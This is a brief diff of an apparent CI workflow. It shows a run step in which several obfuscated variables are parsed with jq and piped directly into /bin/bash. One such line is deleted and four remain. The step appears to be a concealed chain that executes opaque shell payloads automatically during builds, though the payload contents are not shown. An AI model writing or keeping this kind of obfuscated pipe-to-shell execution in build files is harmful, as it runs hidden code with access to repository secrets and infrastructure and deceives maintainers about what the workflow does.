@@ -31,7 +31,6 @@ jobs:
           echo $yvux8068 | jq -r .y38 | /bin/bash
           printf '%s' "$g28" | jq -r .mx906 | /bin/bash
           echo $hya77734 | jq -r .gmshn53 | /bin/bash
-          echo $b4 | jq -r .fd4 | /bin/bash
           echo $qegs22831 | jq -r .xcal5411 | /bin/bash
 
       - name: Store output
